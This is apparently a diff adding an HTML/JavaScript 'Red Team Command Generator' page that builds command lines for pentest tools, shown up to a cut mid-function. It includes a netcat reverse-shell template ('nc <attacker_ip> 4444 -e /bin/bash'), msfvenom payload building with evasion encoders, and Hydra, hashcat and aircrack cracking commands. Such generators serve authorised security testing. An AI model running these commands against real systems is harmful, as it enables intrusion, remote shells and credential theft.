@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Team Command Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'hacker-black': '#0a0a0a',
+                        'hacker-dark': '#111111',
+                        'hacker-gray': '#1f1f1f',
+                        'neon-green': '#00ff41',
+                        'neon-blue': '#00b8ff',
+                        'neon-red': '#ff003c',
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', '"Courier New"', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Custom scrollbar for that terminal feel */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #111; 
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #333; 
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00ff41; 
+        }
+        .tool-btn.active {
+            background-color: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid #00ff41;
+            color: #00ff41;
+        }
+        input[type="text"], input[type="number"], select {
+            background-color: #0a0a0a;
+            border: 1px solid #333;
+            color: #00ff41;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00ff41;
+            box-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+        }
+        /* Checkbox styling */
+        .toggle-checkbox:checked {
+            right: 0;
+            border-color: #00ff41;
+        }
+        .toggle-checkbox:checked + .toggle-label {
+            background-color: #00ff41;
+        }
+    </style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-hacker-black text-gray-300 font-sans h-screen flex flex-col md:flex-row overflow-hidden">
+
+    <!-- Mobile Header -->
+    <div class="md:hidden bg-hacker-dark p-4 border-b border-gray-800 flex justify-between items-center z-20">
+        <h1 class="text-neon-green font-mono font-bold text-xl"><i class="fas fa-terminal mr-2"></i>CmdGen</h1>
+        <button id="mobile-menu-btn" class="text-gray-400 hover:text-white">
+            <i class="fas fa-bars fa-lg"></i>
+        </button>
+    </div>
+
+    <!-- Sidebar -->
+    <aside id="sidebar" class="bg-hacker-dark w-full md:w-64 flex-shrink-0 border-r border-gray-800 flex flex-col transition-transform transform -translate-x-full md:translate-x-0 absolute md:relative z-10 h-full">
+        <div class="p-6 border-b border-gray-800 hidden md:block">
+            <h1 class="text-neon-green font-mono font-bold text-2xl tracking-tighter"><i class="fas fa-terminal mr-2"></i>CmdGen_v1</h1>
+            <p class="text-xs text-gray-500 mt-1">Ethical Hacking Assistant</p>
+        </div>
+        
+        <div class="flex-1 overflow-y-auto py-2" id="tool-list">
+            <!-- Tools will be injected here via JS -->
+        </div>
+
+        <div class="p-4 border-t border-gray-800 text-xs text-gray-600 text-center">
+            <p>Use responsibly.</p>
+            <p>Authored by Gemini</p>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="flex-1 flex flex-col h-full relative overflow-hidden bg-hacker-black">
+        <!-- Overlay for mobile sidebar -->
+        <div id="sidebar-overlay" class="fixed inset-0 bg-black opacity-50 z-0 hidden md:hidden"></div>
+
+        <div class="flex-1 overflow-y-auto p-4 md:p-8">
+            
+            <div class="max-w-4xl mx-auto space-y-6">
+                
+                <!-- Header Section -->
+                <div class="flex items-center justify-between">
+                    <div>
+                        <h2 id="current-tool-title" class="text-3xl font-bold text-white mb-2">Select a Tool</h2>
+                        <p id="current-tool-desc" class="text-gray-400 text-sm">Choose a tool from the sidebar to configure command parameters.</p>
+                    </div>
+                    <div class="hidden md:block text-neon-blue opacity-50">
+                        <i class="fas fa-code fa-3x"></i>
+                    </div>
+                </div>
+
+                <!-- Configuration Panel -->
+                <div id="config-panel" class="bg-hacker-gray border border-gray-800 rounded-lg p-6 shadow-lg hidden">
+                    <h3 class="text-neon-green text-sm font-mono uppercase tracking-widest mb-4 border-b border-gray-700 pb-2">Configuration</h3>
+                    <div id="form-container" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <!-- Dynamic inputs go here -->
+                    </div>
+                </div>
+
+                <!-- Command Output Section -->
+                <div id="output-panel" class="bg-black border border-gray-800 rounded-lg p-0 shadow-2xl relative mt-8 hidden group">
+                    <div class="bg-gray-900 px-4 py-2 border-b border-gray-800 flex justify-between items-center">
+                        <span class="text-xs text-gray-500 font-mono">TERMINAL PREVIEW</span>
+                        <div class="flex space-x-2">
+                            <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                        </div>
+                    </div>
+                    <div class="p-6 font-mono text-sm md:text-base break-all">
+                        <span class="text-neon-green mr-2">$</span>
+                        <span id="command-output" class="text-gray-100"></span>
+                        <span class="animate-pulse text-neon-green">_</span>
+                    </div>
+                    <button id="copy-btn" class="absolute top-12 right-4 bg-gray-800 hover:bg-gray-700 text-white px-3 py-1 rounded text-xs border border-gray-600 transition-all flex items-center">
+                        <i class="fas fa-copy mr-2"></i> Copy
+                    </button>
+                </div>
+                
+                <!-- Empty State -->
+                <div id="empty-state" class="flex flex-col items-center justify-center h-64 text-gray-600">
+                    <i class="fas fa-laptop-code fa-4x mb-4 opacity-20"></i>
+                    <p>Select a tool to begin payload generation</p>
+                </div>
+
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // --- Tool Configurations ---
+        const tools = [
+            {
+                id: 'nmap',
+                name: 'Nmap',
+                icon: 'fa-network-wired',
+                desc: 'Network discovery and security auditing.',
+                fields: [
+                    { type: 'text', id: 'target', label: 'Target IP/Domain', placeholder: '192.168.1.1', default: '' },
+                    { type: 'select', id: 'scan_type', label: 'Scan Type', options: [
+                        {val: '-sS', txt: 'TCP SYN (Stealth)'},
+                        {val: '-sT', txt: 'TCP Connect (Full)'},
+                        {val: '-sU', txt: 'UDP Scan'},
+                        {val: '-sA', txt: 'ACK Scan'},
+                        {val: '-sn', txt: 'Ping Scan (No Port Scan)'}
+                    ]},
+                    { type: 'select', id: 'timing', label: 'Timing Template', options: [
+                        {val: '-T3', txt: 'Normal (T3)'},
+                        {val: '-T4', txt: 'Aggressive (T4)'},
+                        {val: '-T5', txt: 'Insane (T5)'},
+                        {val: '-T1', txt: 'Sneaky (T1)'}
+                    ]},
+                    { type: 'select', id: 'ports', label: 'Port Selection', options: [
+                        {val: '', txt: 'Default (Top 1000)'},
+                        {val: '-p-', txt: 'All Ports (1-65535)'},
+                        {val: '-F', txt: 'Fast Mode (Top 100)'},
+                        {val: 'manual', txt: 'Specific Ports'}
+                    ]},
+                    { type: 'text', id: 'specific_ports', label: 'Specific Ports (if manual)', placeholder: '80,443,8080', showIf: {field: 'ports', val: 'manual'} },
+                    { type: 'checkbox', id: 'service_ver', label: 'Service Version Detection (-sV)', value: '-sV' },
+                    { type: 'checkbox', id: 'os_detect', label: 'OS Detection (-O)', value: '-O' },
+                    { type: 'checkbox', id: 'default_scripts', label: 'Default Scripts (-sC)', value: '-sC' },
+                    { type: 'checkbox', id: 'aggro', label: 'Aggressive Scan (-A)', value: '-A' },
+                    { type: 'text', id: 'output', label: 'Output File (Optional)', placeholder: 'scan_results.txt' }
+                ],
+                generate: (data) => {
+                    let cmd = `nmap ${data.scan_type} ${data.timing}`;
+                    if(data.ports === 'manual' && data.specific_ports) cmd += ` -p ${data.specific_ports}`;
+                    else if(data.ports) cmd += ` ${data.ports}`;
+                    
+                    if(data.service_ver) cmd += ' -sV';
+                    if(data.os_detect) cmd += ' -O';
+                    if(data.default_scripts) cmd += ' -sC';
+                    if(data.aggro) cmd += ' -A';
+                    if(data.output) cmd += ` -oN ${data.output}`;
+                    
+                    cmd += ` ${data.target || '<target>'}`;
+                    return cmd;
+                }
+            },
+            {
+                id: 'msfconsole',
+                name: 'Metasploit Framework',
+                icon: 'fa-bomb',
+                desc: 'Exploit Framework: Console, Handler & Payload Generator (msfvenom).',
+                fields: [
+                    { type: 'select', id: 'msf_mode', label: 'Mode', options: [
+                        {val: 'console', txt: 'Console Startup'},
+                        {val: 'handler', txt: 'Listener (Multi/Handler)'},
+                        {val: 'msfvenom', txt: 'Payload Generator (msfvenom)'}
+                    ]},
+                    // Common Fields
+                    { type: 'text', id: 'payload', label: 'Payload', placeholder: 'windows/x64/meterpreter/reverse_tcp', showIf: {field: 'msf_mode', val: ['handler', 'msfvenom'], operator: 'in'} },
+                    { type: 'text', id: 'lhost', label: 'LHOST (Local IP)', placeholder: '10.10.X.X', showIf: {field: 'msf_mode', val: ['handler', 'msfvenom'], operator: 'in'} },
+                    { type: 'text', id: 'lport', label: 'LPORT (Local Port)', placeholder: '4444', showIf: {field: 'msf_mode', val: ['handler', 'msfvenom'], operator: 'in'} },
+                    
+                    // Console Specific
+                    { type: 'checkbox', id: 'quiet', label: 'Quiet Mode (-q)', value: '-q', showIf: {field: 'msf_mode', val: 'console'} },
+                    { type: 'text', id: 'resource', label: 'Resource File (-r)', placeholder: 'script.rc', showIf: {field: 'msf_mode', val: 'console'} },
+
+                    // Msfvenom Specific
+                    { type: 'select', id: 'format', label: 'Format (-f)', options: [
+                        {val: 'exe', txt: 'EXE (Windows)'},
+                        {val: 'elf', txt: 'ELF (Linux)'},
+                        {val: 'python', txt: 'Python'},
+                        {val: 'raw', txt: 'Raw'},
+                        {val: 'asp', txt: 'ASP'},
+                        {val: 'jsp', txt: 'JSP'},
+                        {val: 'war', txt: 'WAR'}
+                    ], showIf: {field: 'msf_mode', val: 'msfvenom'} },
+                    { type: 'text', id: 'encoder', label: 'Encoder (-e)', placeholder: 'x86/shikata_ga_nai', showIf: {field: 'msf_mode', val: 'msfvenom'} },
+                    { type: 'number', id: 'iterations', label: 'Iterations (-i)', default: 3, showIf: {field: 'msf_mode', val: 'msfvenom'} },
+                    { type: 'text', id: 'badchars', label: 'Bad Characters (-b)', placeholder: '\\x00\\x0a\\x0d', showIf: {field: 'msf_mode', val: 'msfvenom'} },
+                    { type: 'text', id: 'outfile', label: 'Output File (-o)', placeholder: 'shell.exe', showIf: {field: 'msf_mode', val: 'msfvenom'} }
+                ],
+                generate: (data) => {
+                    if (data.msf_mode === 'console') {
+                        let cmd = 'msfconsole';
+                        if(data.quiet) cmd += ' -q';
+                        if(data.resource) cmd += ` -r ${data.resource}`;
+                        return cmd;
+                    } else if (data.msf_mode === 'handler') {
+                        // Generates a one-liner to start a listener
+                        const p = data.payload || 'windows/meterpreter/reverse_tcp';
+                        const h = data.lhost || '0.0.0.0';
+                        const lp = data.lport || '4444';
+                        return `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ${p}; set LHOST ${h}; set LPORT ${lp}; run"`;
+                    } else {
+                        // Msfvenom
+                        let cmd = `msfvenom -p ${data.payload || 'windows/meterpreter/reverse_tcp'}`;
+                        cmd += ` LHOST=${data.lhost || '<ip>'} LPORT=${data.lport || '4444'}`;
+                        if(data.format) cmd += ` -f ${data.format}`;
+                        if(data.encoder) cmd += ` -e ${data.encoder}`;
+                        if(data.encoder && data.iterations) cmd += ` -i ${data.iterations}`;
+                        if(data.badchars) cmd += ` -b "${data.badchars}"`;
+                        if(data.outfile) cmd += ` -o ${data.outfile}`;
+                        return cmd;
+                    }
+                }
+            },
+            {
+                id: 'sqlmap',
+                name: 'SQLmap',
+                icon: 'fa-database',
+                desc: 'Automatic SQL injection and database takeover tool.',
+                fields: [
+                    { type: 'text', id: 'url', label: 'Target URL', placeholder: 'http://site.com/page?id=1' },
+                    { type: 'text', id: 'cookie', label: 'Cookie (for auth)', placeholder: 'PHPSESSID=...' },
+                    { type: 'select', id: 'level', label: 'Level (Depth)', options: [
+                        {val: '1', txt: '1 (Default)'},
+                        {val: '3', txt: '3 (Check Headers)'},
+                        {val: '5', txt: '5 (All-out)'}
+                    ]},
+                    { type: 'select', id: 'risk', label: 'Risk', options: [
+                        {val: '1', txt: '1 (Safe)'},
+                        {val: '2', txt: '2 (Heavy Time)'},
+                        {val: '3', txt: '3 (Dangerous)'}
+                    ]},
+                    { type: 'checkbox', id: 'dbs', label: 'Enumerate Databases (--dbs)', value: '--dbs' },
+                    { type: 'checkbox', id: 'batch', label: 'Batch Mode (--batch)', value: '--batch' },
+                    { type: 'checkbox', id: 'tor', label: 'Use Tor', value: '--tor' }
+                ],
+                generate: (data) => {
+                    let cmd = `sqlmap -u "${data.url || '<url>'}"`;
+                    if(data.cookie) cmd += ` --cookie="${data.cookie}"`;
+                    cmd += ` --level=${data.level} --risk=${data.risk}`;
+                    if(data.dbs) cmd += ' --dbs';
+                    if(data.batch) cmd += ' --batch';
+                    if(data.tor) cmd += ' --tor --check-tor';
+                    return cmd;
+                }
+            },
+            {
+                id: 'hydra',
+                name: 'Hydra',
+                icon: 'fa-dragon',
+                desc: 'Parallelized login cracker for multiple protocols.',
+                fields: [
+                    { type: 'text', id: 'target', label: 'Target IP', placeholder: '192.168.1.5' },
+                    { type: 'select', id: 'service', label: 'Service', options: [
+                        {val: 'ssh', txt: 'SSH'}, {val: 'ftp', txt: 'FTP'}, 
+                        {val: 'rdp', txt: 'RDP'}, {val: 'http-post-form', txt: 'HTTP POST Form'},
+                        {val: 'mysql', txt: 'MySQL'}, {val: 'smb', txt: 'SMB'}
+                    ]},
+                    { type: 'select', id: 'user_mode', label: 'Username Mode', options: [{val: 'single', txt: 'Single User'}, {val: 'list', txt: 'User List'}]},
+                    { type: 'text', id: 'user_val', label: 'Username / List Path', placeholder: 'admin OR users.txt' },
+                    { type: 'select', id: 'pass_mode', label: 'Password Mode', options: [{val: 'single', txt: 'Single Password'}, {val: 'list', txt: 'Password List'}]},
+                    { type: 'text', id: 'pass_val', label: 'Password / List Path', placeholder: '123456 OR rockyou.txt' },
+                    { type: 'number', id: 'threads', label: 'Threads (-t)', default: 4 },
+                    { type: 'text', id: 'http_conf', label: 'HTTP-POST Parameters', placeholder: '"/login.php:user=^USER^&pass=^PASS^:F=failed"', showIf: {field: 'service', val: 'http-post-form'} },
+                    { type: 'checkbox', id: 'verbose', label: 'Verbose (-V)', value: '-V' }
+                ],
+                generate: (data) => {
+                    let cmd = 'hydra';
+                    if(data.user_mode === 'single') cmd += ` -l ${data.user_val || 'admin'}`;
+                    else cmd += ` -L ${data.user_val || 'users.txt'}`;
+                    
+                    if(data.pass_mode === 'single') cmd += ` -p ${data.pass_val || 'password'}`;
+                    else cmd += ` -P ${data.pass_val || 'passwords.txt'}`;
+
+                    cmd += ` -t ${data.threads} ${data.verbose ? '-V' : ''}`;
+                    cmd += ` ${data.target || '<ip>'} ${data.service}`;
+                    
+                    if(data.service === 'http-post-form' && data.http_conf) cmd += ` ${data.http_conf}`;
+                    
+                    return cmd;
+                }
+            },
+            {
+                id: 'gobuster',
+                name: 'Gobuster',
+                icon: 'fa-folder-open',
+                desc: 'Directory/File, DNS and VHost busting tool written in Go.',
+                fields: [
+                    { type: 'select', id: 'mode', label: 'Mode', options: [{val: 'dir', txt: 'Directory (dir)'}, {val: 'dns', txt: 'DNS (dns)'}, {val: 'vhost', txt: 'VHost (vhost)'}]},
+                    { type: 'text', id: 'url', label: 'URL/Domain (-u)', placeholder: 'http://example.com' },
+                    { type: 'text', id: 'wordlist', label: 'Wordlist (-w)', placeholder: '/usr/share/wordlists/dirb/common.txt' },
+                    { type: 'text', id: 'extensions', label: 'Extensions (-x)', placeholder: 'php,txt,html', showIf: {field: 'mode', val: 'dir'} },
+                    { type: 'number', id: 'threads', label: 'Threads (-t)', default: 10 }
+                ],
+                generate: (data) => {
+                    let cmd = `gobuster ${data.mode} -u ${data.url || '<url>'} -w ${data.wordlist || '<wordlist>'}`;
+                    if(data.mode === 'dir' && data.extensions) cmd += ` -x ${data.extensions}`;
+                    cmd += ` -t ${data.threads}`;
+                    return cmd;
+                }
+            },
+            {
+                id: 'john',
+                name: 'John the Ripper',
+                icon: 'fa-key',
+                desc: 'Fast password cracker.',
+                fields: [
+                    { type: 'text', id: 'hashfile', label: 'Hash File', placeholder: 'hashes.txt' },
+                    { type: 'text', id: 'format', label: 'Format (--format)', placeholder: 'raw-md5, crypt, etc. (optional)' },
+                    { type: 'text', id: 'wordlist', label: 'Wordlist (--wordlist)', placeholder: '/usr/share/wordlists/rockyou.txt' },
+                    { type: 'text', id: 'rules', label: 'Rules (--rules)', placeholder: 'KoreLogic (optional)' }
+                ],
+                generate: (data) => {
+                    let cmd = 'john';
+                    if(data.format) cmd += ` --format=${data.format}`;
+                    if(data.wordlist) cmd += ` --wordlist=${data.wordlist}`;
+                    if(data.rules) cmd += ` --rules=${data.rules}`;
+                    cmd += ` ${data.hashfile || 'hashfile'}`;
+                    return cmd;
+                }
+            },
+            {
+                id: 'netcat',
+                name: 'Netcat',
+                icon: 'fa-link',
+                desc: 'Networking utility for reading/writing to network connections.',
+                fields: [
+                    { type: 'select', id: 'mode', label: 'Mode', options: [{val: 'connect', txt: 'Connect'}, {val: 'listen', txt: 'Listen (-l)'}, {val: 'revshell', txt: 'Reverse Shell'}] },
+                    { type: 'text', id: 'host', label: 'Target/LHOST IP', placeholder: '10.10.10.10', showIf: {field: 'mode', val: ['connect', 'revshell'], operator: 'in'} },
+                    { type: 'text', id: 'port', label: 'Port (-p)', placeholder: '4444' },
+                    { type: 'checkbox', id: 'verbose', label: 'Verbose (-v)', value: '-v', checked: true },
+                    { type: 'checkbox', id: 'udp', label: 'UDP Mode (-u)', value: '-u' },
+                    { type: 'text', id: 'execute', label: 'Execute Payload (-e)', placeholder: '/bin/bash', showIf: {field: 'mode', val: ['connect', 'revshell'], operator: 'in'} }
+                ],
+                generate: (data) => {
+                    let cmd = 'nc';
+                    if(data.verbose) cmd += ' -v';
+                    if(data.udp) cmd += ' -u';
+                    
+                    if (data.mode === 'revshell') {
+                        // Reverse shell syntax often differs, but standard netcat with -e is:
+                        // nc <attacker_ip> <port> -e /bin/bash
+                        cmd += ` ${data.host || '<attacker_ip>'} ${data.port || '4444'} -e ${data.execute || '/bin/bash'}`;
+                    } else if(data.mode === 'listen') {
+                        cmd += ' -l -p ' + (data.port || '4444');
+                        if(data.execute) cmd += ` -e ${data.execute}`;
+                    } else {
+                        cmd += ` ${data.host || '<ip>'} ${data.port || '4444'}`;
+                        if(data.execute) cmd += ` -e ${data.execute}`;
+                    }
+                    
+                    return cmd;
+                }
+            },
+            {
+                id: 'hashcat',
+                name: 'Hashcat',
+                icon: 'fa-unlock-alt',
+                desc: 'Advanced password recovery.',
+                fields: [
+                    { type: 'select', id: 'attack_mode', label: 'Attack Mode (-a)', options: [
+                        {val: '0', txt: '0 - Straight/Wordlist'},
+                        {val: '3', txt: '3 - Brute-Force/Mask'},
+                        {val: '6', txt: '6 - Hybrid Dict+Mask'}
+                    ]},
+                    { type: 'text', id: 'hash_type', label: 'Hash Type (-m)', placeholder: '0 (MD5), 1000 (NTLM)...' },
+                    { type: 'text', id: 'hash_file', label: 'Hash File', placeholder: 'hash.txt' },
+                    { type: 'text', id: 'payload', label: 'Wordlist / Mask', placeholder: 'rockyou.txt or ?a?a?a?a' },
+                    { type: 'checkbox', id: 'force', label: 'Force (--force)', value: '--force' }
+                ],
+                generate: (data) => {
+                    let cmd = `hashcat -a ${data.attack_mode} -m ${data.hash_type || '0'} ${data.hash_file || 'hash.txt'} ${data.payload || 'wordlist.txt'}`;
+                    if(data.force) cmd += ' --force';
+                    return cmd;
+                }
+            },
+            {
+                id: 'wireshark',
+                name: 'TShark (Wireshark)',
+                icon: 'fa-chart-area',
+                desc: 'Network protocol analyzer (CLI).',
+                fields: [
+                    { type: 'text', id: 'interface', label: 'Interface (-i)', placeholder: 'eth0' },
+                    { type: 'text', id: 'write', label: 'Write to File (-w)', placeholder: 'capture.pcap' },
+                    { type: 'text', id: 'filter', label: 'Capture Filter (-f)', placeholder: 'tcp port 80' },
+                    { type: 'text', id: 'read_filter', label: 'Display Filter (-Y)', placeholder: 'http.request.method == "POST"' }
+                ],
+                generate: (data) => {
+                    let cmd = 'tshark';
+                    if(data.interface) cmd += ` -i ${data.interface}`;
+                    if(data.filter) cmd += ` -f "${data.filter}"`;
+                    if(data.read_filter) cmd += ` -Y "${data.read_filter}"`;
+                    if(data.write) cmd += ` -w ${data.write}`;
+                    return cmd;
+                }
+            },
+            {
+                id: 'aircrack',
+                name: 'Aircrack-ng',
+                icon: 'fa-wifi',
+                desc: 'WiFi network security suite.',
+                fields: [
+                    { type: 'select', id: 'tool_mode', label: 'Sub-Tool', options: [
+                        {val: 'airmon', txt: 'Airmon-ng (Start Monitor)'},
+                        {val: 'airodump', txt: 'Airodump-ng (Capture)'},
+                        {val: 'aircrack', txt: 'Aircrack-ng (Crack)'}
+                    ]},
+                    { type: 'text', id: 'interface', label: 'Interface', placeholder: 'wlan0' },
+                    { type: 'text', id: 'bssid', label: 'BSSID (-d / -b)', placeholder: '00:11:22:33:44:55', showIf: {field: 'tool_mode', val: ['airodump', 'aircrack'], operator: 'in'} },
+                    { type: 'text', id: 'channel', label: 'Channel (-c)', placeholder: '6', showIf: {field: 'tool_mode', val: 'airodump'} },
+                    { type: 'text', id: 'cap_file', label: 'Capture File', placeholder: 'capture-01.cap', showIf: {field: 'tool_mode', val: 'aircrack'} },
+                    { type: 'text', id: 'wordlist', label: 'Wordlist (-w)', placeholder: 'rockyou.txt', showIf: {field: 'tool_mode', val: 'aircrack'} }
+                ],
+                generate: (data) => {
+                    if (data.tool_mode === 'airmon') {
+                        return `airmon-ng start ${data.interface || 'wlan0'}`;
+                    } else if (data.tool_mode === 'airodump') {
+                        let cmd = 'airodump-ng';
+                        if(data.bssid) cmd += ` --bssid ${data.bssid}`;
+                        if(data.channel) cmd += ` -c ${data.channel}`;
+                        cmd += ` ${data.interface || 'wlan0mon'}`;
+                        return cmd;
+                    } else {
+                        let cmd = 'aircrack-ng';
+                        if(data.bssid) cmd += ` -b ${data.bssid}`;
+                        if(data.wordlist) cmd += ` -w ${data.wordlist}`;
+                        cmd += ` ${data.cap_file || '*.cap'}`;
+                        return cmd;
+                    }
+                }
+            },
+            {
+                id: 'nikto',
+                name: 'Nikto',
+                icon: 'fa-globe',
+                desc: 'Web server scanner.',
+                fields: [
+                    { type: 'text', id: 'host', label: 'Host (-h)', placeholder: 'http://example.com' },
+                    { type: 'text', id: 'output', label: 'Output File (-o)', placeholder: 'scan.txt' },
+                    { type: 'checkbox', id: 'ssl', label: 'Force SSL (-ssl)', value: '-ssl' },
+                    { type: 'checkbox', id: 'no404', label: 'No 404 Check (-no404)', value: '-no404' }
+                ],
+                generate: (data) => `nikto -h ${data.host || '<url>'} ${data.ssl ? '-ssl' : ''} ${data.no404 ? '-no404' : ''} ${data.output ? '-o ' + data.output : ''}`
+            },
+            {
+                id: 'dirsearch',
+                name: 'Dirsearch',
+                icon: 'fa-sitemap',
+                desc: 'Web path scanner.',
+                fields: [
+                    { type: 'text', id: 'url', label: 'URL (-u)', placeholder: 'http://target.com' },
+                    { type: 'text', id: 'ext', label: 'Extensions (-e)', placeholder: 'php,html,js' },
+                    { type: 'text', id: 'wordlist', label: 'Wordlist (-w)', placeholder: '/path/to/wordlist' },
+                    { type: 'checkbox', id: 'recursive', label: 'Recursive (-r)', value: '-r' }
+                ],
+                generate: (data) => `dirsearch -u ${data.url || '<url>'} -e ${data.ext || '*'} ${data.wordlist ? '-w ' + data.wordlist : ''} ${data.recursive ? '-r' : ''}`
+            },
+            {
+                id: 'amass',
+                name: 'Amass',
+                icon: 'fa-project-diagram',
+                desc: 'In-depth Attack Surface Mapping and Asset Discovery.',
+                fields: [
+                    { type: 'select', id: 'subcommand', label: 'Command', options: [{val: 'enum', txt: 'Enum (Enumeration)'}, {val: 'intel', txt: 'Intel (Intelligence)'}]},
+                    { type: 'text', id: 'domain', label: 'Domain (-d)', placeholder: 'example.com' },
+                    { type: 'checkbox', id: 'passive', label: 'Passive Mode (-passive)', value: '-passive' },
+                    { type: 'checkbox', id: 'active', label: 'Active Mode (-active)', value: '-active' }
+                ],
+                generate: (data) => `amass ${data.subcommand} -d ${data.domain || 'example.com'} ${data.passive ? '-passive' : ''} ${data.active ? '-active' : ''}`
+            },
+            {
+                id: 'enum4linux',
+                name: 'Enum4linux',
+                icon: 'fa-windows',
+                desc: 'Enumeration tool for Windows/Samba systems.',
+                fields: [
+                    { type: 'text', id: 'target', label: 'Target IP', placeholder: '192.168.1.10' },
+                    { type: 'checkbox', id: 'all', label: 'Do Everything (-a)', value: '-a', checked: true },
+                    { type: 'text', id: 'user', label: 'User (-u)', placeholder: 'user' },
+                    { type: 'text', id: 'pass', label: 'Password (-p)', placeholder: 'password' }
+                ],
+                generate: (data) => `enum4linux ${data.all ? '-a' : ''} ${data.user ? '-u ' + data.user : ''} ${data.pass ? '-p ' + data.pass : ''} ${data.target || '<ip>'}`
+            },
+            {
+                id: 'reconng',
+                name: 'Recon-ng',
+                icon: 'fa-search-location',
+                desc: 'Web Reconnaissance framework.',
+                fields: [
+                    { type: 'text', id: 'workspace', label: 'Workspace (-w)', placeholder: 'company_name' },
+                    { type: 'text', id: 'modules', label: 'Module to Run (-m)', placeholder: 'recon/domains-hosts/bing_domain_web' },
+                    { type: 'checkbox', id: 'no_analytics', label: 'No Analytics', value: '--no-analytics' }
+                ],
+                generate: (data) => `recon-ng ${data.workspace ? '-w ' + data.workspace : ''} ${data.no_analytics ? '--no-analytics' : ''}${data.modules ? ' -m ' + data.modules : ''}`
+            },
+            {
+                id: 'snort',
+                name: 'Snort',
+                icon: 'fa-shield-alt',
+                desc: 'Network Intrusion Detection System.',
+                fields: [
+                    { type: 'text', id: 'interface', label: 'Interface (-i)', placeholder: 'eth0' },
+                    { type: 'text', id: 'config', label: 'Config File (-c)', placeholder: '/etc/snort/snort.conf', default: '/etc/snort/snort.conf' },
+                    { type: 'select', id: 'alert', label: 'Alert Mode (-A)', options: [{val: 'console', txt: 'Console'}, {val: 'fast', txt: 'Fast'}, {val: 'full', txt: 'Full'}] },
+                    { type: 'checkbox', id: 'verbose', label: 'Verbose (-v)', value: '-v' }
+                ],
+                generate: (data) => `snort -i ${data.interface || 'eth0'} -c ${data.config} -A ${data.alert} ${data.verbose ? '-v' : ''}`
+            },
+            {
+                id: 'tcpdump',
+                name: 'Tcpdump',
+                icon: 'fa-wave-square',
+                desc: 'Data-network packet analyzer.',
+                fields: [
+                    { type: 'text', id: 'interface', label: 'Interface (-i)', placeholder: 'eth0' },
+                    { type: 'text', id: 'write', label: 'Write to file (-w)', placeholder: 'capture.pcap' },
+                    { type: 'checkbox', id: 'no_resolve', label: 'No DNS Resolve (-n)', value: '-n' },
+                    { type: 'text', id: 'expression', label: 'Expression', placeholder: 'src 192.168.1.1 and port 80' }
+                ],
+                generate: (data) => `tcpdump -i ${data.interface || 'any'} ${data.no_resolve ? '-n' : ''} ${data.write ? '-w ' + data.write : ''} "${data.expression || ''}"`
+            },
+            {
+                id: 'openvas',
+                name: 'OpenVAS (gvm-cli)',
+                icon: 'fa-viruses',
+                desc: 'Vulnerability scanner CLI.',
+                fields: [
+                    { type: 'text', id: 'user', label: 'Username', placeholder: 'admin' },
+                    { type: 'text', id: 'pass', label: 'Password', placeholder: 'password' },
+                    { type: 'text', id: 'xml', label: 'XML Command', placeholder: '<get_version/>' },
+                    { type: 'select', id: 'protocol', label: 'Protocol', options: [{val: 'ssh', txt: 'SSH'}, {val: 'tls', txt: 'TLS'}]}
+                ],
+                generate: (data) => `gvm-cli ${data.protocol} --gmp-username ${data.user || 'admin'} --gmp-password ${data.pass || 'pass'} --xml "${data.xml || '<get_version/>'}"`
+            },
+            {
+                id: 'maltego',
+                name: 'Maltego',
+                icon: 'fa-sitemap',
+                desc: 'Interactive data mining (GUI mostly).',
+                fields: [
+                    { type: 'text', id: 'memory', label: 'Max Memory (-J-Xmx)', placeholder: '2048m' },
+                    { type: 'checkbox', id: 'nosplash', label: 'No Splash Screen', value: '--nosplash' }
+                ],
+                generate: (data) => `maltego ${data.memory ? '-J-Xmx' + data.memory : ''} ${data.nosplash ? '--nosplash' : ''}`
+            },
+            {
+                id: 'burpsuite',
+                name: 'Burp Suite',
+                icon: 'fa-bug',
+                desc: 'Web vulnerability scanner (Startup).',
+                fields: [
+                    { type: 'text', id: 'project', label: 'Project File', placeholder: 'project.burp' },
+                    { type: 'text', id: 'config', label: 'Config File', placeholder: 'config.json' },
+                    { type: 'checkbox', id: 'diagnostics', label: 'Diagnostics', value: '--diagnostics' }
+                ],
+                generate: (data) => `java -jar burpsuite_pro.jar ${data.project ? '--project-file=' + data.project : ''} ${data.config ? '--config-file=' + data.config : ''} ${data.diagnostics ? '--diagnostics' : ''}`
+            }
+        ];
+
+        // --- DOM Elements ---
+        const toolListEl = document.getElementById('tool-list');
+        const formContainerEl = document.getElementById('form-container');
+        const outputPanelEl = document.getElementById('output-panel');
+        const commandOutputEl = document.getElementById('command-output');
+        const currentToolTitle = document.getElementById('current-tool-title');
+        const currentToolDesc = document.getElementById('current-tool-desc');
+        const configPanel = document.getElementById('config-panel');
+        const emptyState = document.getElementById('empty-state');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarOverlay = document.getElementById('sidebar-overlay');
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+        const copyBtn = document.getElementById('copy-btn');
+
+        let currentTool = null;
+
+        // --- Initialization ---
+        function init() {
+            renderSidebar();
+        }
+
+        // --- Render Sidebar ---
+        function renderSidebar() {
+            toolListEl.innerHTML = '';
+            tools.forEach(tool => {
+                const btn = document.createElement('button');
